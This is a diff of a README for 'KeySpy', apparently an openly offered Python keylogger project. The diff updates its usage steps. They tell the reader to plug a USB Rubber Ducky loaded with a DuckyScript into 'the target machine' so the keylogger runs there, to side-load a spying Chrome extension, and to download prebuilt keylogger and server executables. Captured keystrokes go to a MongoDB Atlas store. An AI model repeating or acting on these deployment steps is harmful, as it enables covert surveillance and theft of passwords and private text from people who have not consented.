@@ -35,23 +35,23 @@ KeySpy is a simple Python keylogger with a web interface for viewing captured ke
    pip install -r requirements.txt
 
 ## Usage
-   ### Rubber Ducky:
+   ### 🦆Rubber Ducky
    - Download the DuckyScript.txt and load that in USB Rubber Ducky.
    - Connect the USB Rubber Ducky to the target machine at least 30 seconds.
-   - It will run the `Keylogger` & `Payload Executor` on that machine.
-   ### Web Extension:
+   - It will run KeySpy on that machine.
+   ### 🕸️Web Extension:
    - Open the Browser.
    - Search this link `chrome://extensions/`.
    - Click on `Load Unpack`.
    - Add W3bSpy-Client folder from `./src/W3bSpy/W3bSpy-Client`
-   ### Web Interface:
-   - install Flask on the monitoring machine
-   - Navigate to this directory `./src/cl0ud/server` & open terminal on that directory.
-   - run this command `python ./weblogger.py`.
+    
+### Web Interface:
+   - Install [W3Blogger_v1.1.exe](https://github.com/3rr0r-505/KeySpy/raw/main/exe/W3Blogger/W3Blogger_v1.1.exe) and launch it.
    
 
 ## Note
-- create a `mongoDB Atlas` cluster and use the connection links.
+- For Downloading the `kSpy-AIO.exe` file [click here](https://github.com/3rr0r-505/KeySpy/raw/main/exe/kSpy-AIO/kSpy-AIO_v1.2.exe).
+- Create a `mongoDB Atlas` cluster and use the connection links.
 - Soon the extension will be available on the chrome store.
 
 ## Contributing
